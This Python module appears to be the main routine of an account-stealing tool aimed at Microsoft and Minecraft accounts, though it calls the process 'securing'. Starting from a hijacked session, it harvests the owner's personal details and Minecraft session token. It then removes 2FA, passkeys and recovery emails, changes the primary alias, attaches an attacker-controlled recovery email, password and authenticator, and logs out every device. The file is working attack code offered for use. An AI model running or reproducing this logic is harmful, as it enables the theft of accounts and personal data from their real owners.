from cogs import config
from securing.utils.security_information import security_information
from securing.utils.change_primary_alias import change_primary_alias
from securing.utils.add_authenticator import add_authenticator
from securing.utils.get_recovery_code import get_recovery_code
from securing.utils.remove_services import remove_services
from securing.utils.generate_email import generate_email
from securing.utils.get_owner_info import get_owner_info
from securing.utils.remove_proof import remove_proof
from securing.utils.remove_zyger import remove_zyger
from securing.utils.get_cookies import get_cookies
from securing.utils.get_profile import get_profile
from securing.utils.remove_2fa import remove_2fa
from securing.utils.logout_all import logout_all
from securing.utils.recovery import recover
from securing.utils.get_amrp import get_amrp
from securing.utils.get_ssid import get_ssid
from securing.utils.get_amc import get_amc
from securing.utils.get_t import get_t

from minecraft.get_namechange import get_username_info
from minecraft.get_method import get_method
from minecraft.get_capes import get_capes
from minecraft.get_xbl import get_xbl

from database.database import DBConnection
import httpx
import uuid
import json

database = DBConnection()

async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
    # Main file where all processes to securing the account occur

    # To auto update if you edit the config via command
    config = json.load(open("config.json", "r+"))["autosecure"]
    replace_alias = config["replace_main_alias"]
    enable_2fa = config["enable_2fa"]
    
    apicanary = await get_cookies(session) 
    
    T = await get_t(session)
    print("[+] - Found T")

    verificationToken = await get_amc(session)
    ownerInfo = await get_owner_info(session, verificationToken)

    if ownerInfo:
        print("[+] - Got Owner Info")
        
        accountInfo["microsoft"]["firstName"] = ownerInfo["Fname"]
        accountInfo["microsoft"]["lastName"] = ownerInfo["Lname"]
        accountInfo["microsoft"]["region"] = ownerInfo["region"]
        accountInfo["microsoft"]["birthday"] = ownerInfo["birthday"]
        accountInfo["microsoft"]["fullName"] = f"{ownerInfo['Fname']} {ownerInfo['Lname']}"
    
    # Minecraft checking
    print("[~] - Checking Minecraft Account")
    XBLResponse = await get_xbl(session)

    if XBLResponse:
        print("[+] - Got XBL (Has Xbox Profile)")

        # XBL && Token
        xbl = XBLResponse["xbl"]

        ssid = await get_ssid(xbl)
        
        # Get capes, profile and purchase method
        if ssid:    
            print("[+] - Got SSID! (Has Minecraft)")

            capes = await get_capes(ssid)
            if capes:
                accountInfo["minecraft"]["capes"] = ", ".join(i["alias"] for i in capes)
                print(f"[+] - Got capes")
            else:
                accountInfo["minecraft"]["capes"] = "No capes"

            # Gets account name
            profile = await get_profile(ssid)
            if not profile:
                print("[x] - Failed to get profile (No Minecraft Java)")
            else:
                print(f"[+] - Got profile (Has Minecraft Java)")
                accountInfo["minecraft"]["SSID"] = ssid
                accountInfo["minecraft"]["name"] = profile
                
                usernameInfo = await get_username_info(ssid)
                if not usernameInfo:
                    accountInfo["minecraft"]["uchange"] = "Yes"
                else:
                    accountInfo["minecraft"]["uchange"] = f"Changeable in {usernameInfo} days"

            method = await get_method(ssid)
            if method:
                accountInfo["minecraft"]["method"] = method
                print(f"[+] - Got purchase method")
        else:
            print("[x] - Failed to get SSID")

    else:
        print("[x] - Failed to get XBL (Account has no Xbox Profile)")
        accountInfo["minecraft"]["name"] = "No Minecraft"

    # Security Steps
    await get_amrp(session, T)
    print("[+] - Got AMRP")

    # 2FA
    await remove_2fa(session, apicanary)

    # Pass Keys / Windows Hello Exploit
    await remove_zyger(session, apicanary)

    # Removes security_emails / Auth Apps
    await remove_proof(session, apicanary)
    print("[+] - Removed all Proofs")
    
    # Third Party Launchers (Minecraft, Prism)
    await remove_services(session)

    if recovery:

        securityParameters = json.loads(await security_information(session))
        print("[+] - Got Security Parameters")

        if securityParameters:

            # Original Email
            main_email = securityParameters["email"]
            encryptedNetID = securityParameters["WLXAccount"]["manageProofs"]["encryptedNetId"]

            # Change Primary Alias is broken
            if replace_alias:
            
                primaryEmail = f"auto{uuid.uuid4().hex[:12]}"
                print(f"[+] - Generated Primary Email ({primaryEmail}@outlook.com)")
                info = await change_primary_alias(session, primaryEmail, apicanary)
                if info:
                    accountInfo["microsoft"]["email"] = f"{primaryEmail}@outlook.com"
                    main_email = f"{primaryEmail}@outlook.com"
                    print(f"[+] - Changed Primary Alias")
                else:
                    accountInfo["microsoft"]["email"] = main_email
            else:
                accountInfo["microsoft"]["email"] = main_email

            recovery_code = await get_recovery_code(
                session,
                apicanary,
                encryptedNetID
            )
            print(f"[+] - Got Recovery Code | {recovery_code}")

            security_email = uuid.uuid4().hex[:16]
            password = uuid.uuid4().hex[:12]

            type, security_email = await generate_email(security_email, password)

            print(f"[+] - Generated Security Email ({security_email})")
            database.add_security_email(security_email, password)

            print("[~] - Automaticly Securing Account...")
            data = await recover(session, main_email, recovery_code, security_email, password, type)

            if data and data != "invalid":
                accountInfo["microsoft"]["security_email"] = security_email
                accountInfo["microsoft"]["recovery_code"] = data["recovery_code"]
                accountInfo["microsoft"]["password"] = password
            else:
                print(f"[X] - Failed to secure this account")
    
    # Add Authenticator
    if enable_2fa:
        auth = await add_authenticator(session)
        accountInfo["microsoft"]["auth_secret"] = auth
        print(f"[+] - Added Authenticator ({auth})")
        
    # Logout all devices
    await logout_all(session, apicanary)
    print("[+] - Account has been secured")

    return accountInfo